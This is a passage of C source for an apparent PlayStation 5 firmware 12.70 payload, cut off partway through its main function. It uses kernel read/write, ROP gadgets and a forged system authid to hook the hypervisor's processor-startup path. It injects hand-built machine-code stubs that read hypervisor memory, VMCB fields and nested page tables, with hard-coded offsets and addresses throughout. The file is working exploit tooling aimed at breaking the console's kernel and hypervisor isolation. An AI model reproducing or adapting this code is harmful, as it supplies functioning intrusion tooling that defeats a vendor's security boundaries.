#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include <ps5/kernel.h>
#include <ps5/klog.h>

#include "kdlsym.h"
#include "khook.h"
#include "paging.h"
#include "util.h"
#ifdef AP_OWNED_RESUME_1270
#include "carrier_1270.h"
#endif
#ifdef AP_VMCB_RW_1270
#include "break_hv_payload/vmcb_rw_probe.h"
#endif
#ifdef AP_NPT_TABLE_DUMP_1270
#include "break_hv_payload/npt_table_dump.h"
#endif
#ifdef AP_VMCB_SURVEY_1270
#include "break_hv_payload/vmcb_survey_1270.h"
#endif
#ifdef AP_VMCB_STRIKE_1270
#include "break_hv_payload/vmcb_strike_1270.h"
#endif
#ifdef AP_VMCB_EARLY_LATE_1270
#include "break_hv_payload/vmcb_early_late_1270.h"
#endif
#ifdef AP_CORE_ARG_1270
#include "break_hv_payload/ap_arg_probe_1270.h"
#endif

#if defined(AP_OWNED_RESUME_1270) && !defined(FIXED_AP_PREP_ONLY_1270) && \
    !defined(AP_OWNED_RESUME_REENABLE_AFTER_KP_1270)
#error "The owned resume carrier KP'd on 12.70; do not rebuild the full test unchanged"
#endif

#if defined(AP_NPT_TABLE_DUMP_1270) && !defined(FIXED_AP_PREP_ONLY_1270) && \
    !defined(AP_NPT_DUMP_REENABLE_AFTER_KP_1270)
#error "The 4 KiB NPT table dump KP'd on 12.70; do not rebuild the full test unchanged"
#endif

#define FW_1270             0x12700000U
#define SYSTEM_AUTHID       0x4800000000000007ULL
#define HOOK_CORE           0
#define HOOK_IST            6
#define CAVE_STATE_OFF      0x600ULL
#define PCPU_ARRAY_OFFSET   0x2e9cf00ULL
#define PCPU_STRIDE         0x980ULL
#define SECOND_MARKER       0x1270DBDB5EEDBEEFULL
#define BIG_SAVE_BYTES      0x600U
#define MAX_AWAKE_POLLS     600U
#define MAX_RESUME_POLLS    15U
#ifdef AP_OWNED_RESUME_1270
#define CARRIER_PA          (owned_carrier.pa)
#else
#define CARRIER_PA          0x3ffff000ULL
#endif
#ifdef AP_VMCB_EARLY_LATE_1270
#define AP_SCAN_ENTERED     0x1270A9E17E5E3001ULL
#define AP_MARKER           0x1270A9E17E5E3002ULL
#define AP_SCAN_INCOMPLETE     0x1270A9E17E5E3003ULL
#define PARAM_QWORDS        3U
#elif defined(AP_VMCB_STRIKE_1270)
#define AP_SURVEY_ENTERED   0x1270A9E17E5E2001ULL
#define AP_MARKER           0x1270A9E17E5E2002ULL
#define AP_SURVEY_REJECTED  0x1270A9E17E5E2003ULL
#define AP_STRIKE_FAILED    0x1270A9E17E5E2004ULL
#define PARAM_QWORDS        3U
#elif defined(AP_VMCB_SURVEY_1270)
#define AP_SURVEY_ENTERED   0x1270A9E17E5E1001ULL
#define AP_MARKER           0x1270A9E17E5E1002ULL
#define AP_SURVEY_REJECTED  0x1270A9E17E5E1003ULL
#define PARAM_QWORDS        3U
#else
#define AP_MARKER           0x1270A9E17E5E0002ULL
#define PARAM_QWORDS        0U
#endif
#ifdef AP_NPT_TABLE_DUMP_1270
#define NPT_TABLE_PA        0x62a81000ULL
#define NPT_DUMP_OFF        0x1000ULL
#define NPT_DUMP_BYTES      4096U
#define STUB_BYTES          75U
#define STUB_QWORDS         10U
#define PROBE_STEM          "fixed-ap-nptdump"
#elif defined(AP_CORE_ARG_1270)
#define STUB_BYTES          62U
#define STUB_QWORDS         8U
#define PROBE_STEM          "fixed-ap-arg"
#elif defined(AP_VMCB_EARLY_LATE_1270)
#define STUB_BYTES          189U
#define STUB_QWORDS         24U
#define PROBE_STEM          "fixed-ap-vmcb-early-late"
#elif defined(AP_VMCB_STRIKE_1270)
#define STUB_BYTES          223U
#define STUB_QWORDS         28U
#define PROBE_STEM          "fixed-ap-vmcb-strike"
#elif defined(AP_VMCB_SURVEY_1270)
#define STUB_BYTES          170U
#define STUB_QWORDS         22U
#define PROBE_STEM          "fixed-ap-vmcb-survey"
#elif defined(AP_VMCB_RW_1270)
#define AP_RW_ENTERED       0x1270A9E17E5E0001ULL
#define AP_RW_BAD           0x1270A9E17E5E0003ULL
#define VMCB_PA            0x62a57000ULL
#define STUB_BYTES          227U
#define STUB_QWORDS         29U
#define PROBE_STEM          "fixed-ap-vmcb-rw"
#elif defined(AP_HV_READ_1270)
#define HV_LOADER_PA        0x62800000ULL
#define HV_HEAP_PTR_OFF     0x83028ULL
#define HV_PCPUS_PTR_OFF    0x82a60ULL
#ifdef AP_HV_NPT_ENTRY_1270
#ifndef NPT_READ_PA_1270
#error "NPT_READ_PA_1270 must name the physical qword to read"
#endif
#define HV_READ_PA          NPT_READ_PA_1270
#define PROBE_STEM          "fixed-ap-nptentry"
#ifdef AP_HV_DUAL_READ_1270
#ifndef NPT_READ_PA2_1270
#error "NPT_READ_PA2_1270 must name the second physical qword"
#endif
#define HV_READ_PA2         NPT_READ_PA2_1270
#define STUB_BYTES          94U
#define STUB_QWORDS         12U
#else
#define STUB_BYTES          68U
#define STUB_QWORDS         9U
#endif
#elif defined(AP_HV_DUAL_READ_1270)
#ifdef AP_HV_VMCB15_FIELDS_1270
#define HV_READ_PA          0x62a75090ULL
#define HV_READ_PA2         0x62a750b0ULL
#define PROBE_STEM          "fixed-ap-vmcb15fields"
#elif defined(AP_HV_VMCB_FIELDS_1270)
#define HV_READ_PA          0x62a57090ULL
#define HV_READ_PA2         0x62a570b0ULL
#define PROBE_STEM          "fixed-ap-vmcbfields"
#elif defined(AP_HV_VMCB_PTR_READ_1270)
#define HV_READ_PA          (HV_LOADER_PA + HV_HEAP_PTR_OFF)
#define HV_READ_PA2         0x62a000a8ULL
#define PROBE_STEM          "fixed-ap-vmcbptr"
#else
#define HV_READ_PA          (HV_LOADER_PA + HV_HEAP_PTR_OFF)
#define HV_READ_PA2         (HV_LOADER_PA + HV_PCPUS_PTR_OFF)
#define PROBE_STEM          "fixed-ap-hvpair"
#endif
#define STUB_BYTES          94U
#define STUB_QWORDS         12U
#elif defined(AP_HV_PCPUS_READ_1270)
#define HV_READ_PA          (HV_LOADER_PA + HV_PCPUS_PTR_OFF)
#define PROBE_STEM          "fixed-ap-pcpus"
#define STUB_BYTES          68U
#define STUB_QWORDS         9U
#else
#define HV_READ_PA          (HV_LOADER_PA + HV_HEAP_PTR_OFF)
#define PROBE_STEM          "fixed-ap-hvread"
#define STUB_BYTES          68U
#define STUB_QWORDS         9U
#endif
#else
#define STUB_BYTES          42U
#define STUB_QWORDS         6U
#ifdef AP_OWNED_RESUME_1270
#define PROBE_STEM          "owned-resume-ap"
#else
#define PROBE_STEM          "fixed-ap"
#endif
#endif
#define NX_BIT              (1ULL << 63)
#define FRAME_2M            0x000fffffffe00000ULL
#define RAM_LIMIT           0x400000000ULL
#ifdef RESUME_STOCK_AP_CR3_1270
#define TEST_CR3_PA         0x68000ULL
#define OUTPUT_STEM        "stock-apcr3"
#else
#define OUTPUT_STEM        "stock-resume"
#endif

static uint8_t saved_head[KH_SCRATCH_MIN];
static uint8_t saved_big[BIG_SAVE_BYTES];
static char output_path[128];
static uint8_t ap_stub[STUB_QWORDS * 8];
static uint64_t carrier_pml4e_addr, carrier_pml4e_original;
static int carrier_map_changed;
#ifdef AP_NPT_TABLE_DUMP_1270
static uint8_t npt_dump_before[NPT_DUMP_BYTES];
static uint8_t npt_dump_after[NPT_DUMP_BYTES];
static int npt_dump_armed;
#endif
#ifdef AP_CORE_ARG_1270
static uint64_t ap_args[16];
#endif
#ifdef AP_OWNED_RESUME_1270
static carrier1270_t owned_carrier;
static uint8_t owned_carrier_before[STUB_QWORDS * 8];
static uint64_t owned_carrier_va;
static int owned_carrier_ready;
#endif

static int append_store(kh_chain_t *chain, uint64_t dst, uint64_t value)
{
  return kh_chain_g(chain, KERNEL_GADGET_POP_RCX) == 0 &&
         kh_chain_q(chain, dst) == 0 &&
         kh_chain_g(chain, KERNEL_GADGET_POP_RAX) == 0 &&
         kh_chain_q(chain, value) == 0 &&
         kh_chain_g(chain, KERNEL_GADGET_ST_RCX_RAX) == 0 ? 0 : -1;
}

#if defined(AP_VMCB_RW_1270) || defined(AP_NPT_TABLE_DUMP_1270) || \
    defined(AP_CORE_ARG_1270)
static int patch_token(uint64_t token, uint64_t value)
{
  unsigned matches = 0;
  for (unsigned i = 0; i + 8 <= STUB_BYTES; ++i) {
    if (memcmp(ap_stub + i, &token, 8) == 0) {
      memcpy(ap_stub + i, &value, 8);
      ++matches;
    }
  }
  return matches == 1 ? 0 : -1;
}
#endif

static int build_stub(uint64_t oracle, uint64_t vector)
{
#ifdef AP_VMCB_EARLY_LATE_1270
  if (vmcb_early_late_1270_len != STUB_BYTES)
    return -1;
  memset(ap_stub, 0, sizeof(ap_stub));
  memcpy(ap_stub, vmcb_early_late_1270, STUB_BYTES);
#elif defined(AP_VMCB_STRIKE_1270)
  if (vmcb_strike_1270_len != STUB_BYTES)
    return -1;
  memset(ap_stub, 0, sizeof(ap_stub));
  memcpy(ap_stub, vmcb_strike_1270, STUB_BYTES);
#elif defined(AP_CORE_ARG_1270)
  if (ap_arg_probe_1270_len != STUB_BYTES)
    return -1;
  memset(ap_stub, 0, sizeof(ap_stub));
  memcpy(ap_stub, ap_arg_probe_1270, STUB_BYTES);
  if (patch_token(0x1111111111111111ULL, oracle + 8) != 0 ||
      patch_token(0x2222222222222222ULL, oracle) != 0 ||
      patch_token(0x3333333333333333ULL, vector) != 0)
    return -1;
#elif defined(AP_VMCB_SURVEY_1270)
  if (vmcb_survey_1270_len != STUB_BYTES)
    return -1;
  memset(ap_stub, 0, sizeof(ap_stub));
  memcpy(ap_stub, vmcb_survey_1270, STUB_BYTES);
#elif defined(AP_NPT_TABLE_DUMP_1270)
  if (npt_table_dump_len != STUB_BYTES)
    return -1;
  memset(ap_stub, 0, sizeof(ap_stub));
  memcpy(ap_stub, npt_table_dump, STUB_BYTES);
  if (patch_token(0x1111111111111111ULL, kdldmap(NPT_TABLE_PA)) != 0 ||
      patch_token(0x2222222222222222ULL,
                  kdlsym(KERNEL_SYM_DATA_CAVE) + NPT_DUMP_OFF) != 0 ||
      patch_token(0x3333333333333333ULL, oracle) != 0 ||
      patch_token(0x4444444444444444ULL, vector) != 0)
    return -1;
#elif defined(AP_VMCB_RW_1270)
  if (vmcb_rw_probe_len != STUB_BYTES)
    return -1;
  memset(ap_stub, 0, sizeof(ap_stub));
  memcpy(ap_stub, vmcb_rw_probe, STUB_BYTES);
  if (patch_token(0x1111111111111111ULL, kdldmap(VMCB_PA)) != 0 ||
      patch_token(0x2222222222222222ULL, oracle) != 0 ||
      patch_token(0x3333333333333333ULL, vector) != 0)
    return -1;
#elif defined(AP_HV_DUAL_READ_1270)
  // Capture the heap offset and one HV pointer in one S3 window.
  static const uint8_t template[STUB_BYTES] = {
    0x48, 0x8d, 0x25, 0xf9, 0x0e, 0x00, 0x00, // rsp = page + 0xf00
    0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,    // rax = heap global VA
    0x48, 0x8b, 0x10,                         // rdx = [rax]
    0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,    // rax = oracle + 8
    0x48, 0x89, 0x10,                         // [rax] = rdx
    0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,    // rax = second HV VA
    0x48, 0x8b, 0x10,                         // rdx = [rax]
    0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,    // rax = oracle + 16
    0x48, 0x89, 0x10,                         // [rax] = rdx
    0x48, 0xba, 0, 0, 0, 0, 0, 0, 0, 0,    // rdx = AP marker
    0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,    // rax = oracle
    0x48, 0x89, 0x10,                         // [rax] = rdx
    0x48, 0xb9, 0, 0, 0, 0, 0, 0, 0, 0,    // rcx = stock vector
    0xff, 0xe1                                // jmp rcx
  };
  uint64_t heap_va = kdldmap(HV_READ_PA);
  uint64_t pcpus_va = kdldmap(HV_READ_PA2);
  uint64_t heap_result = oracle + 8;
  uint64_t pcpus_result = oracle + 16;
  uint64_t marker = AP_MARKER;
  memset(ap_stub, 0, sizeof(ap_stub));
  memcpy(ap_stub, template, sizeof(template));
  memcpy(ap_stub + 9, &heap_va, 8);
  memcpy(ap_stub + 22, &heap_result, 8);
  memcpy(ap_stub + 35, &pcpus_va, 8);
  memcpy(ap_stub + 48, &pcpus_result, 8);
  memcpy(ap_stub + 61, &marker, 8);
  memcpy(ap_stub + 71, &oracle, 8);
  memcpy(ap_stub + 84, &vector, 8);
#elif defined(AP_HV_READ_1270)
  // Read exactly one candidate HV qword from root 0, then return to stock AP.
  static const uint8_t template[STUB_BYTES] = {
    0x48, 0x8d, 0x25, 0xf9, 0x0e, 0x00, 0x00, // rsp = page + 0xf00
    0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,    // rax = HV candidate VA
    0x48, 0x8b, 0x10,                         // rdx = [rax]
    0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,    // rax = oracle + 16
    0x48, 0x89, 0x10,                         // [rax] = rdx
    0x48, 0xba, 0, 0, 0, 0, 0, 0, 0, 0,    // rdx = AP marker
    0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,    // rax = oracle + 8
    0x48, 0x89, 0x10,                         // [rax] = rdx
    0x48, 0xb9, 0, 0, 0, 0, 0, 0, 0, 0,    // rcx = stock vector
    0xff, 0xe1                                // jmp rcx
  };
  uint64_t marker = AP_MARKER;
  uint64_t hv_va = kdldmap(HV_READ_PA);
  uint64_t result_va = oracle + 8;
  memset(ap_stub, 0, sizeof(ap_stub));
  memcpy(ap_stub, template, sizeof(template));
  memcpy(ap_stub + 9, &hv_va, 8);
  memcpy(ap_stub + 22, &result_va, 8);
  memcpy(ap_stub + 35, &marker, 8);
  memcpy(ap_stub + 45, &oracle, 8);
  memcpy(ap_stub + 58, &vector, 8);
#else
  static const uint8_t template[STUB_BYTES] = {
    0x48, 0x8d, 0x25, 0xf9, 0x0e, 0x00, 0x00, // rsp = page + 0xf00
    0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,       // rax = oracle
    0x48, 0xba, 0, 0, 0, 0, 0, 0, 0, 0,       // rdx = marker
    0x48, 0x89, 0x10,                         // [rax] = rdx
    0x48, 0xb9, 0, 0, 0, 0, 0, 0, 0, 0,       // rcx = stock vector
    0xff, 0xe1                                // jmp rcx
  };
  memset(ap_stub, 0, sizeof(ap_stub));
  memcpy(ap_stub, template, sizeof(template));
  uint64_t marker = AP_MARKER;
  memcpy(ap_stub + 9, &oracle, 8);
  memcpy(ap_stub + 19, &marker, 8);
  memcpy(ap_stub + 32, &vector, 8);
#endif
  return 0;
}

static int restore_carrier_map(void)
{
  if (!carrier_map_changed)
    return 0;
  uint64_t current = 0, readback = 0;
  if (kread(carrier_pml4e_addr, &current, 8) != 0 ||
      ((current ^ carrier_pml4e_original) &
       ~(NX_BIT | (1ULL << 5) | (1ULL << 6))))
    return -1;
  uint64_t restored = current | NX_BIT;
  if (kwrite(carrier_pml4e_addr, &restored, 8) != 0 ||
      kread(carrier_pml4e_addr, &readback, 8) != 0 ||
      readback != restored)
    return -2;
  carrier_map_changed = 0;
  return 0;
}

static int read_qword(uint64_t addr, uint64_t *value)
{
  *value = 0;
  return kread(addr, value, sizeof(*value));
}

#if defined(AP_HV_READ_1270) || defined(AP_VMCB_RW_1270) || \
    defined(AP_NPT_TABLE_DUMP_1270)
static int guest_maps_pa(uint64_t pmap, uint64_t va, uint64_t expected)
{
  const uint64_t frame1g = 0x000fffffc0000000ULL;
  const uint64_t frame4k = 0x000ffffffffff000ULL;
  uint64_t pml4e = 0, pdpte = 0, pde = 0, pte = 0;
  if (find_pml4e(pmap, va, &pml4e) == UINT64_MAX ||
      !(pml4e & 1) || (pml4e & 0x80) ||
      find_pdpe(pmap, va, &pdpte) == UINT64_MAX || !(pdpte & 1))
    return -1;
  if (pdpte & 0x80)
    return ((pdpte & frame1g) | (va & 0x3fffffffULL)) == expected ? 0 : -2;
  if (find_pde(pmap, va, &pde) == UINT64_MAX || !(pde & 1))
    return -3;
  if (pde & 0x80)
    return ((pde & FRAME_2M) | (va & 0x1fffffULL)) == expected ? 0 : -4;
  if (find_pte(pmap, va, &pte) == UINT64_MAX || !(pte & 1))
    return -5;
  return ((pte & frame4k) | (va & 0xfffULL)) == expected ? 0 : -6;
}
#endif

#if defined(AP_NPT_TABLE_DUMP_1270) || defined(AP_CORE_ARG_1270)
static int all_zero(const uint8_t *buf, size_t len)
{
  for (size_t i = 0; i < len; ++i)
    if (buf[i] != 0)
      return 0;
  return 1;
}
#endif

#ifdef AP_NPT_TABLE_DUMP_1270
static int save_npt_dump(void)
{
  size_t len = strlen(output_path);
  if (len < 4 || strcmp(output_path + len - 4, ".txt") != 0)
    return -1;
  char bin_path[sizeof(output_path)];
  memcpy(bin_path, output_path, len - 4);
  memcpy(bin_path + len - 4, ".bin", 5);
  int fd = open(bin_path, O_WRONLY | O_CREAT | O_EXCL, 0600);
  if (fd < 0)
    return -2;
  ssize_t written = write(fd, npt_dump_after, sizeof(npt_dump_after));
  int synced = written == (ssize_t)sizeof(npt_dump_after) ? fsync(fd) : -1;
  int closed = close(fd);
  return written == (ssize_t)sizeof(npt_dump_after) &&
         synced == 0 && closed == 0 ? 0 : -3;
}
#endif

#ifdef RESUME_STOCK_AP_CR3_1270
static int firmware_cr3_maps(uint64_t va, int write)
{
  const uint64_t frame4k = 0x000ffffffffff000ULL;
  const uint64_t frame2m = 0x000fffffffe00000ULL;
  const uint64_t nx = 1ULL << 63;
  uint64_t dmap = kdldmap(0), pml4e = 0, pdpte = 0, pde = 0;
  if (read_qword(dmap + TEST_CR3_PA + (((va >> 39) & 0x1ff) * 8), &pml4e) != 0 ||
      !(pml4e & 1) || (pml4e & 0x80) ||
      (pml4e & frame4k) >= 0x400000000ULL ||
      read_qword(dmap + (pml4e & frame4k) + (((va >> 30) & 0x1ff) * 8), &pdpte) != 0 ||
      !(pdpte & 1) || (pdpte & 0x80) ||
      (pdpte & frame4k) >= 0x400000000ULL ||
      read_qword(dmap + (pdpte & frame4k) + (((va >> 21) & 0x1ff) * 8), &pde) != 0 ||
      (pde & 0x81) != 0x81 || ((pml4e | pdpte | pde) & nx) ||
      (write && ((pml4e & pdpte & pde & 2) != 2)))
    return -1;
  return ((pde & frame2m) | (va & 0x1fffff)) < 0x40000000ULL ? 0 : -1;
}
#endif

static int save_line(const char *line, int create)
{
  int flags = O_WRONLY | (create ? O_CREAT | O_EXCL : O_APPEND);
  int fd = open(output_path, flags, 0600);
  if (fd < 0)
    return -1;
  size_t length = strlen(line);
  ssize_t written = write(fd, line, length);
  int synced = written == (ssize_t)length ? fsync(fd) : -1;
  int closed = close(fd);
  return written == (ssize_t)length && synced == 0 && closed == 0 ? 0 : -1;
}

static int save_line_retry(const char *line)
{
  for (unsigned attempt = 0; attempt < 60; ++attempt) {
    if (save_line(line, 0) == 0)
      return 0;
    sleep(1);
  }
  return -1;
}

static int cleanup(khook_t *hook, int armed, uint64_t cave,
                   uint64_t authid, int restore_cave)
{
  int disarm = 0, gate = 0, head = 0, big = 0, marker = 0;
#ifdef AP_NPT_TABLE_DUMP_1270
  int npt_restore = 0;
#endif
  if (armed) {
    intptr_t thread = kernel_get_proc_thread(getpid(), -1);
    uint64_t row_thread = 0;
    uint64_t row = (uint64_t)KERNEL_ADDRESS_DATA_BASE +
                   PCPU_ARRAY_OFFSET + HOOK_CORE * PCPU_STRIDE;
    if (pin_to_core(HOOK_CORE) != 0 || !thread ||
        read_qword(row, &row_thread) != 0 || row_thread != (uint64_t)thread)
      disarm = -1;
    else
      disarm = kh_disarm(hook);
  }
  if (hook->installed && disarm == 0)
    gate = kh_restore(hook);
  if (restore_cave && disarm == 0 && gate == 0) {
    head = kwrite(cave, saved_head, sizeof(saved_head));
    big = kwrite(cave + KH_OFF_BIG_CHAIN, saved_big, sizeof(saved_big));
    marker = kwrite(cave + KH_OFF_USER, saved_head + KH_OFF_USER, 8);
#ifdef AP_NPT_TABLE_DUMP_1270
    if (npt_dump_armed) {
      uint8_t verify[NPT_DUMP_BYTES];
      if (kwrite(cave + NPT_DUMP_OFF, npt_dump_before,
                 sizeof(npt_dump_before)) != 0 ||
          kread(cave + NPT_DUMP_OFF, verify, sizeof(verify)) != 0 ||
          memcmp(verify, npt_dump_before, sizeof(verify)) != 0)
        npt_restore = -1;
      npt_dump_armed = 0;
    }
#endif
  }
  int carrier_map = restore_carrier_map();
#ifdef AP_OWNED_RESUME_1270
  int carrier = 0, release = 0;
  if (owned_carrier_ready) {
    uint8_t current[sizeof(owned_carrier_before)] = {0};
    if (kread(owned_carrier_va, current, sizeof(current)) != 0)
      carrier = -1;
    else if (memcmp(current, ap_stub, sizeof(current)) == 0) {
      uint8_t restored[sizeof(owned_carrier_before)] = {0};
      if (kwrite(owned_carrier_va, owned_carrier_before,
                 sizeof(owned_carrier_before)) != 0 ||
          kread(owned_carrier_va, restored, sizeof(restored)) != 0 ||
          memcmp(restored, owned_carrier_before, sizeof(restored)) != 0)
        carrier = -2;
    } else if (memcmp(current, owned_carrier_before,
                      sizeof(current)) != 0)
      carrier = -3;
    release = carrier1270_release(&owned_carrier);
    owned_carrier_ready = 0;
  }
#endif
  int auth = kernel_set_ucred_authid(getpid(), authid);
#ifdef AP_OWNED_RESUME_1270
  klog("AFP1270,1,owned-cleanup,carrier=%d,release=%d\n", carrier, release);
#endif
  klog("AFP1270,1,cleanup,disarm=%d,gate=%d,head=%d,big=%d,marker=%d,carrier_map=%d,auth=%d\n",
       disarm, gate, head, big, marker, carrier_map, auth);
#ifdef AP_NPT_TABLE_DUMP_1270
  klog("AFP1270,1,npt-cleanup,restore=%d\n", npt_restore);
#endif
  return disarm == 0 && gate == 0 && head == 0 && big == 0 &&
         marker == 0 && carrier_map == 0 && auth == 0
#ifdef AP_NPT_TABLE_DUMP_1270
         && npt_restore == 0
#endif
#ifdef AP_OWNED_RESUME_1270
         && carrier == 0 && release == 0
#endif
         ? 0 : -1;
}

int main(void)
{
  uint32_t fw = kernel_get_fw_version();
  if ((fw & 0xffff0000U) != FW_1270) {
    klog("RSH1270,1,stop,stage=firmware,fw=0x%08x\n", fw);
    return 2;
  }

  uint64_t cave = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t target = kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL);
  uint64_t stock_vector = kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR);
  uint64_t pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
  uint64_t cr3 = 0, state = 0, marker_before = 0, ap_before = 0;
#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
  uint64_t survey_before = 0;
#endif
#ifdef AP_VMCB_STRIKE_1270
  uint64_t strike_ctrl_before = 0;
#endif
#ifdef AP_VMCB_EARLY_LATE_1270
  uint64_t scan_before[3] = {0};
#endif
#ifdef AP_HV_READ_1270
  uint64_t hv_value_before = 0;
#ifdef AP_HV_DUAL_READ_1270
  uint64_t hv_value_before2 = 0;
#endif
#endif
#ifdef AP_VMCB_RW_1270
  uint64_t rw_before[5] = {0};
#endif
  if (target < ktext(0) || target >= ktext(KH_KIMG_MAX) ||
      stock_vector < ktext(0) || stock_vector >= ktext(KH_KIMG_MAX) ||
      read_qword(pmap + 0x28, &cr3) != 0 || cr3 == 0 || (cr3 & 0xfff) ||
      read_qword(cave + CAVE_STATE_OFF, &state) != 0 || state != 0 ||
      read_qword(cave + KH_OFF_USER, &marker_before) != 0 ||
      marker_before != 0 ||
      read_qword(cave + KH_OFF_USER + 8, &ap_before) != 0 ||
      ap_before != 0
#if defined(AP_VMCB_SURVEY_1270) || defined(AP_VMCB_STRIKE_1270)
      || read_qword(cave + KH_OFF_USER + 16, &survey_before) != 0 ||
      survey_before != 0
#endif
#ifdef AP_VMCB_STRIKE_1270
      || read_qword(cave + KH_OFF_USER + 24, &strike_ctrl_before) != 0 ||
      strike_ctrl_before != 0
#endif
#ifdef AP_VMCB_EARLY_LATE_1270
      || kread(cave + KH_OFF_USER + 16, scan_before,
               sizeof(scan_before)) != 0 ||
      scan_before[0] != 0 || scan_before[1] != 0 ||
      scan_before[2] != 0
#endif
#ifdef AP_HV_READ_1270
      || read_qword(cave + KH_OFF_USER + 16, &hv_value_before) != 0 ||
      hv_value_before != 0 ||
      guest_maps_pa(pmap, kdldmap(HV_READ_PA), HV_READ_PA) != 0
#ifdef AP_HV_DUAL_READ_1270
      || read_qword(cave + KH_OFF_USER + 24, &hv_value_before2) != 0 ||
      hv_value_before2 != 0 ||
      guest_maps_pa(pmap, kdldmap(HV_READ_PA2), HV_READ_PA2) != 0
#endif
#endif
#ifdef AP_VMCB_RW_1270
      || guest_maps_pa(pmap, kdldmap(VMCB_PA + 0x100), VMCB_PA + 0x100) != 0
      || kread(cave + KH_OFF_USER + 16, rw_before, sizeof(rw_before)) != 0 ||
      rw_before[0] != 0 || rw_before[1] != 0 ||
      rw_before[2] != 0 || rw_before[3] != 0 || rw_before[4] != 0
#endif
#ifdef AP_NPT_TABLE_DUMP_1270
      || guest_maps_pa(pmap, kdldmap(NPT_TABLE_PA), NPT_TABLE_PA) != 0 ||
      kread(cave + NPT_DUMP_OFF, npt_dump_before,
            sizeof(npt_dump_before)) != 0 ||
      !all_zero(npt_dump_before, sizeof(npt_dump_before))
#endif
#ifdef AP_CORE_ARG_1270
      || kread(cave + KH_OFF_USER + 16, ap_args, sizeof(ap_args)) != 0 ||
      !all_zero((const uint8_t *)ap_args, sizeof(ap_args))
#endif
      ) {
    klog("RSH1270,1,stop,stage=preflight,target=0x%016" PRIx64
         ",vector=0x%016" PRIx64 ",cr3=0x%016" PRIx64
         ",state=0x%016" PRIx64 ",marker=0x%016" PRIx64 "\n",
         target, stock_vector, cr3, state, marker_before);
    return 3;
  }

#ifdef AP_OWNED_RESUME_1270
  int acquire = carrier1270_acquire(&owned_carrier, kdldmap(0));
  if (acquire != 0 || !owned_carrier.pa ||
      owned_carrier.pa >= 0x40000000ULL) {
    klog("AFP1270,1,stop,stage=owned-acquire,result=%d,pa=0x%016" PRIx64 "\n",
         acquire, owned_carrier.pa);
    return 3;
  }
  owned_carrier_ready = 1;
#endif
  uint64_t carrier_va = kdldmap(CARRIER_PA);
#ifdef AP_OWNED_RESUME_1270
  owned_carrier_va = carrier_va;
#endif
  uint64_t pml4e = 0, pdpte = 0, pde = 0;
  carrier_pml4e_addr = find_pml4e(pmap, carrier_va, &pml4e);
  if (carrier_pml4e_addr == UINT64_MAX ||
      !PDE_FIELD(pml4e, PRESENT) ||
      PDE_ADDR(pml4e) >= RAM_LIMIT || !(pml4e & NX_BIT)) {
    klog("AFP1270,1,stop,stage=pml4,pml4e=0x%016" PRIx64 "\n", pml4e);
    return 3;
  }
  uint64_t pdpte_addr = find_pdpe(pmap, carrier_va, &pdpte);
  if (pdpte_addr == UINT64_MAX ||
      !PDE_FIELD(pdpte, PRESENT) || PDE_FIELD(pdpte, PS) ||
      PDE_ADDR(pdpte) >= RAM_LIMIT || (pdpte & NX_BIT)) {
    klog("AFP1270,1,stop,stage=pdpt,pdpte=0x%016" PRIx64 "\n", pdpte);
    return 3;
  }
  uint64_t pde_addr = find_pde(pmap, carrier_va, &pde);
  if (pde_addr == UINT64_MAX ||
      !PDE_FIELD(pde, PRESENT) || !PDE_FIELD(pde, PS) ||
      (pde & NX_BIT) ||
      (PDE_ADDR(pde) & ~0x1fffffULL) !=
          (CARRIER_PA & ~0x1fffffULL)) {
    klog("AFP1270,1,stop,stage=carrier-topology,pml4e=0x%016" PRIx64
         ",pdpte=0x%016" PRIx64 ",pde=0x%016" PRIx64 "\n",
         pml4e, pdpte, pde);
    return 3;
  }
  carrier_pml4e_original = pml4e;
  if (build_stub(cave + KH_OFF_USER + 8, stock_vector) != 0) {
    klog("AFP1270,1,stop,stage=stub-build\n");
    return 3;
  }
  uint8_t carrier_before[sizeof(ap_stub)] = {0};
  if (kread(carrier_va, carrier_before, sizeof(carrier_before)) != 0) {
    klog("AFP1270,1,stop,stage=carrier-read\n");
    return 3;
  }
#ifdef AP_OWNED_RESUME_1270
  memcpy(owned_carrier_before, carrier_before, sizeof(owned_carrier_before));
#endif

#ifdef RESUME_STOCK_AP_CR3_1270
  if (firmware_cr3_maps(stock_vector, 0) != 0 ||
      firmware_cr3_maps(cave + KH_OFF_USER, 1) != 0) {
    klog("RSH1270,1,stop,stage=firmware-cr3-map,cr3=0x%016llx\n",
         (unsigned long long)TEST_CR3_PA);
    return 3;
  }
  cr3 = TEST_CR3_PA;
#endif

  uint64_t authid = kernel_get_ucred_authid(getpid());
  if (kernel_set_ucred_authid(getpid(), SYSTEM_AUTHID) != 0 ||
      pin_to_core(HOOK_CORE) != 0) {
    kernel_set_ucred_authid(getpid(), authid);
    klog("RSH1270,1,stop,stage=authid-or-affinity\n");
    return 4;
  }

  intptr_t thread = kernel_get_proc_thread(getpid(), -1);
  uint64_t row_thread = 0;
  uint64_t row = (uint64_t)KERNEL_ADDRESS_DATA_BASE +
                 PCPU_ARRAY_OFFSET + HOOK_CORE * PCPU_STRIDE;
  if (!thread || read_qword(row, &row_thread) != 0 ||
      row_thread != (uint64_t)thread ||
      kread(cave, saved_head, sizeof(saved_head)) != 0 ||
      kread(cave + KH_OFF_BIG_CHAIN, saved_big, sizeof(saved_big)) != 0) {
    kernel_set_ucred_authid(getpid(), authid);
    klog("RSH1270,1,stop,stage=thread-or-backup,thread=0x%016" PRIx64
         ",row_thread=0x%016" PRIx64 "\n",
         (uint64_t)thread, row_thread);
    return 5;
  }

